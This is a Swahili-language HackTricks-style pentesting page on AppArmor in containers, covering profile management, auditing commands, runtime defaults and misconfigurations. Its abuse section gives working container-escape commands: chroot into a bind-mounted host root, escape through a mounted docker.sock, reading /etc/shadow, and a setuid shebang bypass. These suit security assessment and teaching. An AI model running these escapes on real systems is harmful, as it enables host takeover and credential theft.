# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

AppArmor ni mfumo wa **Udhibiti wa Lazima wa Upatikanaji** ambao unaweka vikwazo kupitia profaili kwa kila programu. Tofauti na ukaguzi wa jadi wa DAC, ambao hutegemea sana umiliki wa mtumiaji na kikundi, AppArmor inaruhusu kernel kutekeleza sera iliyounganishwa na mchakato mwenyewe. Katika mazingira ya container, hili ni muhimu kwa sababu workload inaweza kuwa na idhini ya kitamaduni ya kutosha kujaribu hatua na bado ikakataliwa kwa sababu profaili yake ya AppArmor hairuhusu njia husika, mount, tabia ya mtandao, au matumizi ya capability.

## Nafasi Katika Kutenganisha Container

Mapitio ya usalama wa container mara nyingi yanashindwa kusonga zaidi ya capabilities na seccomp, lakini AppArmor bado ina umuhimu baada ya ukaguzi huo. Fikiria container ambayo ina idhini zaidi kuliko inavyotakiwa, au workload ilihitaji capability moja ya ziada kwa sababu za uendeshaji. AppArmor bado inaweza kuzuia upatikanaji wa faili, tabia za mount, mitandao, na mifumo ya utekelezaji kwa njia zinazozuia njia za wazi za matumizi mabaya. Hii ndiyo sababu kuzima AppArmor "just to get the application working" kunaweza kimya kimya kubadilisha usanidi wenye hatari kuwa mmoja unaoweza kutumiwa kwa vitendo.

## Maabara

Ili kuangalia kama AppArmor inafanya kazi kwenye host, tumia:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Ili kuona mchakato wa container wa sasa unaendeshwa chini ya:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Tofauti hiyo ni ya kufundisha. Katika kesi ya kawaida, mchakato unapaswa kuonyesha muktadha wa AppArmor uliounganishwa na profaili iliyochaguliwa na runtime. Katika kesi ya unconfined, tabaka hilo la ziada la vikwazo linatoweka.

Unaweza pia kukagua kile Docker kinachodhani kilitumika:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Matumizi ya Runtime

Docker inaweza kutumia profaili ya AppArmor ya chaguo-msingi au iliyobinafsishwa wakati host inapounga mkono. Podman pia inaweza kuingiliana na AppArmor katika mifumo inayotegemea AppArmor, ingawa kwenye distros zinazomtangulia SELinux, mfumo mwingine wa MAC mara nyingi hupata kipaumbele. Kubernetes inaweza kufichua sera ya AppArmor kwenye ngazi ya workload kwenye node ambazo kwa kweli zinaunga mkono AppArmor. LXC na mazingira ya system-container yanayohusiana ya familia ya Ubuntu pia hutumia AppArmor kwa wingi.

Nukta ya vitendo ni kwamba AppArmor si "Docker feature". Ni sifa ya host-kernel ambayo runtimes kadhaa zinaweza kuchagua kuitumia. Ikiwa host haikuunga mkono au runtime imeambiwa kukimbia bila ulinzi (run unconfined), ulinzi unaodaiwa haupo kweli.

Kwa Kubernetes hasa, API ya kisasa ni `securityContext.appArmorProfile`. Tangu Kubernetes `v1.30`, annotations za beta za AppArmor zimepitwa na wakati. Kwenye host zinazounga mkono, `RuntimeDefault` ni profaili ya chaguo-msingi, wakati `Localhost` inaelekeza kwenye profaili ambayo lazima tayari iwe imepakiwa kwenye node. Hii ni muhimu wakati wa ukaguzi kwa sababu manifest inaweza kuonekana kuwa inajua AppArmor huku bado ikiitegemea kabisa msaada wa upande wa node na profaili zilizopakiwa kabla.

Undani mdogo lakini wa matumizi ni kwamba kuweka wazi `appArmorProfile.type: RuntimeDefault` ni kali zaidi kuliko kuacha tu uwanja huo. Ikiwa uwanja umewekwa wazi na node haikuunga mkono AppArmor, kuidhinishwa kunapaswa kushindwa. Ikiwa uwanja umeachwa, workload bado inaweza kukimbia kwenye node bila AppArmor na isipoke safu ya ziada ya kufungiwa. Kutoka kwa mtazamo wa mshambulizi, hii ni sababu nzuri ya kukagua kwa pande zote manifest na hali halisi ya node.

Kwenye host za AppArmor zenye uwezo wa Docker, chaguo-msingi kinachojulikana zaidi ni `docker-default`. Profaili hiyo inatengenezwa kutoka kwenye template ya AppArmor ya Moby na ni muhimu kwa sababu inaelezea kwanini baadhi ya PoC zinazotegemea capabilities bado zinashindwa katika container ya chaguo-msingi. Kwa maneno marefu, `docker-default` inaruhusu ordinary networking, inakataza writes kwenye sehemu kubwa ya `/proc`, inakataza access kwenye sehemu nyeti za `/sys`, inazuia mount operations, na inapunguza ptrace ili isiwe general host-probing primitive. Kuelewa msingi huo kunasaidia kutofautisha "the container has `CAP_SYS_ADMIN`" kutoka "the container can actually use that capability against the kernel interfaces I care about".

## Usimamizi wa Profaili

Profaili za AppArmor kawaida huhifadhiwa chini ya `/etc/apparmor.d/`. Kawaida ya kutaja majina ni kubadilisha slashes katika njia ya executable kuwa nukta. Kwa mfano, profaili ya `/usr/bin/man` kawaida huhifadhiwa kama `/etc/apparmor.d/usr.bin.man`. Undani huu ni muhimu kwa upande wa ulinzi na tathmini kwa sababu ukijua jina la profaili inayotumika, mara nyingi unaweza kupata faili inayolingana haraka kwenye host.

Amri muhimu za kusimamia upande wa host ni pamoja na:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Sababu hizi amri zina umuhimu katika rejea ya container-security ni kwamba zinaelezea jinsi profiles zinavyojengwa kwa vitendo, zinavyopakiwa, kubadilishwa hadi complain mode, na kurekebishwa baada ya mabadiliko ya application. Ikiwa operator ana tabia ya kuhamisha profiles kwenye complain mode wakati wa kutatua matatizo na kusahau kurejesha enforcement, container inaweza kuonekana inalindwa kwenye nyaraka ilhali kwa vitendo inafanya kazi kwa uhuru zaidi.

### Kujenga Na Kusasisha Profiles

`aa-genprof` inaweza kuona tabia ya application na kusaidia kuunda profile kwa njia ya mwingiliano:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` inaweza kutengeneza profaili ya kiolezo ambayo baadaye inaweza kupakiwa na `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wakati binary inabadilika na sera inahitaji kusasishwa, `aa-logprof` inaweza kurudia kukataa zilizopatikana katika logi na kusaidia mwendeshaji kuamua kama kuziruhusu au kuzikataa:
```bash
sudo aa-logprof
```
### Marekodi

Kukataa kwa AppArmor mara nyingi kunaonekana kupitia `auditd`, syslog, au zana kama `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Hii ni muhimu kiutendaji na kwa mashambulizi. Walinda wanaitumia kuboresha profiles. Washambuliaji wanaitumia kujifunza ni njia gani hasa au operesheni inayokataliwa na ikiwa AppArmor ndiye udhibiti unaozuia exploit chain.

### Kutambua Faili Halisi ya profile

Wakati runtime inaonyesha jina maalum la AppArmor profile kwa container, mara nyingi ni muhimu kuoanisha jina hilo na faili ya profile kwenye diski:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Hii ni hasa muhimu wakati wa mapitio upande wa host kwa sababu inaziba pengo kati ya "the container says it is running under profile `lowpriv`" na "the actual rules live in this specific file that can be audited or reloaded".

### Kanuni Muhimu za Kuchunguza

Unapoweza kusoma profile, usisimame tu kwa mistari rahisi ya `deny`. Aina kadhaa za sheria zinaibadilisha kwa kiasi jinsi AppArmor itakavyokuwa muhimu dhidi ya jaribio la container escape:

- `ux` / `Ux`: inaruhusu utekelezaji wa binary lengwa bila confinement. Iwapo helper, shell, au interpreter inayoweza kufikiwa imeruhusiwa chini ya `ux`, hiyo kawaida ndiyo kitu cha kwanza kujaribu.
- `px` / `Px` na `cx` / `Cx`: hufanya transitions za profile wakati wa exec. Hizi si hatari moja kwa moja, lakini zinastahili kuchunguzwa kwa sababu transition inaweza kuingia kwenye profile yenye upana zaidi kuliko ile ya sasa.
- `change_profile`: inaruhusu task kubadilisha hadi profile nyingine iliyopakiwa, mara moja au kwenye exec inayofuata. Iwapo profile ya mwisho ni dhaifu zaidi, hii inaweza kuwa njia ya kutoroka iliyokusudiwa kutoka kwa domain yenye vikwazo.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: hizi zinapaswa kubadilisha kiwango cha uaminifu unachokiweka kwenye profile. `complain` inaweka logi za kukanusha badala ya kuzilazimisha, `unconfined` inaondoa mipaka, na `prompt` inategemea njia ya uamuzi ya userspace badala ya kukanusha tu kwa enforced ya kernel.
- `userns` or `userns create,`: sera mpya za AppArmor zinaweza kutawala uundaji wa user namespaces. Iwapo profile ya container inaikiruhusu waziwazi, nested user namespaces zinaendelea kuwa katika mchezo hata wakati platform inatumia AppArmor kama sehemu ya mkakati wake wa kuimarisha.

Useful host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Aina hii ya ukaguzi mara nyingi ni muhimu zaidi kuliko kukaa ukitazama mamia ya sheria za kawaida za faili. Ikiwa breakout inategemea kuendesha helper, kuingia namespace mpya, au kutoroka ndani ya profile isiyo kali, jibu mara nyingi lipo katika sheria zinazolenga mabadiliko badala ya mistari inayoonekana wazi kama `deny /etc/shadow r`.

## Usanidi usio sahihi

Hitilafu iliyo dhahiri zaidi ni `apparmor=unconfined`. Wasimamizi mara nyingi huweka hiyo wakati wa debugging ya application iliyoshindwa kwa sababu profile ilizuia kwa usahihi kitu hatari au kisichotarajiwa. Ikiwa flag hiyo inabaki kwenye production, safu nzima ya MAC kwa vitendo imeondolewa.

Tatizo jingine lenye undani ni kudhani bind mounts hazina madhara kwa sababu ruhusa za faili zinaonekana kawaida. Kwa kuwa AppArmor ni path-based, kufichua host paths chini ya maeneo mbadala ya mount kunaweza kuingiliana vibaya na sheria za path. Tatizo la tatu ni kusahau kwamba jina la profile katika config file halimaanishi sana ikiwa host kernel haitekelezi AppArmor kwa kweli.

## Matumizi mabaya

Wakati AppArmor imeondoka, shughuli ambazo hapo awali zilikuwa zimetengwa zinaweza ghafla kufanya kazi: kusoma paths nyeti kupitia bind mounts, kufikia sehemu za procfs au sysfs ambazo zilipaswa kubaki ngumu kutumia, kufanya vitendo vinavyohusiana na mount ikiwa capabilities/seccomp pia vinaruhusu, au kutumia paths ambazo profile kawaida ingekataa. AppArmor mara nyingi ndiyo mechanisma inayofafanua kwa nini jaribio la breakout linalotegemea capabilities "linapaswa kufanya kazi" kwa karatasi lakini bado linashindwa kwa vitendo. Ondoa AppArmor, na jaribio lile lile linaweza kuanza kufanikiwa.

Ikiwa unashuku AppArmor ndiyo kitu kikuu kinachozuia chain ya path-traversal, bind-mount, au mount-based abuse, hatua ya kwanza kawaida ni kulinganisha kile kinachopatikana kwa kutumia profile na bila profile. Kwa mfano, ikiwa host path imemounted ndani ya container, anza kwa kuangalia kama unaweza traverse na kuisoma:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Ikiwa container pia ina capability hatari kama `CAP_SYS_ADMIN`, mojawapo ya majaribio yenye manufaa zaidi ni kuona kama AppArmor ndiyo udhibiti unaozuia mount operations au upatikanaji wa kernel filesystems nyeti:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Katika mazingira ambapo host path tayari inapatikana kupitia bind mount, kupoteza AppArmor pia kunaweza kugeuza read-only information-disclosure issue kuwa direct host file access:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Madhumuni ya amri hizi si kwamba AppArmor pekee inaunda breakout. Ni kwamba mara AppArmor itakapofutwa, njia nyingi za matumizi mabaya za filesystem na mount-based zinaweza kujaribiwa mara moja.

### Mfano Kamili: AppArmor Imezimwa + Host Root Mounted

Iwapo container tayari ina host root bind-mounted kwenye `/host`, kuondoa AppArmor kunaweza kubadilisha njia iliyozuiliwa ya matumizi mabaya ya filesystem kuwa host escape kamili:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Mara tu shell inapotekelezwa kupitia host filesystem, mzigo wa kazi umefanikiwa kutoroka mipaka ya container:
```bash
id
hostname
cat /etc/shadow | head
```
### Mfano Kamili: AppArmor Imezimwa + Runtime Socket

Ikiwa kizuizi cha kweli kilikuwa AppArmor kinachozunguka runtime state, socket iliyopachikwa inaweza kutosha kwa kutoroka kabisa:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Njia halisi inategemea mount point, lakini matokeo ya mwisho ni yale yale: AppArmor haizuia tena ufikaji wa runtime API, na runtime API inaweza kuanzisha container inayoweza kuathiri host.

### Mfano Kamili: Path-Based Bind-Mount Bypass

Kwa sababu AppArmor ni path-based, kulinda `/proc/**` hakutalinda moja kwa moja yaliyomo yale yale ya host procfs wakati yanapopatikana kupitia njia tofauti:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Madhara yanategemea hasa ni nini kimeunganishwa (mounted) na kama njia mbadala pia inapita udhibiti mwingine; hata hivyo, mtindo huu ni moja ya sababu zilizo wazi kabisa kwanini AppArmor inapaswa kutathminiwa pamoja na mpangilio wa mount badala ya kutathminiwa peke yake.

### Mfano Kamili: Shebang Bypass

Sera ya AppArmor wakati mwingine inalenga interpreter path kwa njia ambayo haizingatii kikamilifu utekelezaji wa script kupitia shebang handling. Mfano wa kihistoria ulijumuisha kutumia script ambayo mstari wake wa kwanza unaelekeza kwenye interpreter iliyowekwa vikwazo:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Mfano wa aina hii ni muhimu kama ukumbusho kwamba profile intent na actual execution semantics zinaweza kutofautiana. Wakati wa kukagua AppArmor katika container environments, interpreter chains na alternate execution paths zinastahili umakini maalum.

## Mikaguzi

Lengo la mikaguzi hii ni kujibu maswali matatu kwa haraka: je, AppArmor imewezeshwa kwenye host, je, mchakato wa sasa umefungwa, na je, runtime kwa kweli ilitekeleza profile kwa container hii?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Vitu vinavyovutia hapa:

- Ikiwa `/proc/self/attr/current` inaonyesha `unconfined`, kazi haifaidiki na confinement ya AppArmor.
- Ikiwa `aa-status` inaonyesha AppArmor imezimwa au haijapakiwa, jina lolote la profile katika mipangilio ya runtime kwa kiasi kikubwa ni la kuonekana tu.
- Ikiwa `docker inspect` inaonyesha `unconfined` au profile ya custom isiyotarajiwa, hiyo mara nyingi ni sababu njia ya matumizi mabaya inayotegemea filesystem au mount inafanya kazi.
- Ikiwa `/sys/kernel/security/apparmor/profiles` haijumuishi profile uliyotarajia, configuration ya runtime au orchestrator haitoshi yenyewe.
- Ikiwa profile inayoonekana kuwa hardened ina `ux`, `change_profile` pana, `userns`, au sheria za aina `flags=(complain)`, mpaka wa vitendo unaweza kuwa dhaifu zaidi kuliko jina la profile linavyopendekeza.

Ikiwa kontena tayari ina ruhusa zilizoingizwa kwa sababu za uendeshaji, kuiacha AppArmor ikiwa imewezeshwa mara nyingi hufanya tofauti kati ya tukio maalum lililodhibitiwa na kushindwa kwa usalama kwa kiwango kikubwa.

## Chaguo-msingi za runtime

| Runtime / platform | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Udhaifu wa kawaida unaofanywa kwa mkono |
| --- | --- | --- | --- |
| Docker Engine | Imewezeshwa kwa chaguo-msingi kwenye mahosti yenye uwezo wa AppArmor | Inatumia profile ya AppArmor `docker-default` isipobadilishwa | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Inategemea mahosti | AppArmor inasaidiwa kupitia `--security-opt`, lakini chaguo-msingi halisi inategemea host/runtime na si ya kawaida kama profile ya Docker `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Chaguo-msingi kwa sharti | Ikiwa `appArmorProfile.type` haijataja, chaguo-msingi ni `RuntimeDefault`, lakini inatumika tu wakati AppArmor imewezeshwa kwenye node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Inafuata msaada wa node/runtime | Runtimes zinazoungwa mkono na Kubernetes kwa kawaida zinaunga mkono AppArmor, lakini utekelezaji halisi bado unategemea msaada wa node na mipangilio ya workload | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Kwa AppArmor, kinachobadilisha mara nyingi ni often the **host**, si tu runtime. Mipangilio ya profile katika manifest haiundii confinement kwenye node ambapo AppArmor haijawezeshwa.

## Marejeo

- [Muktadha wa usalama wa Kubernetes: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
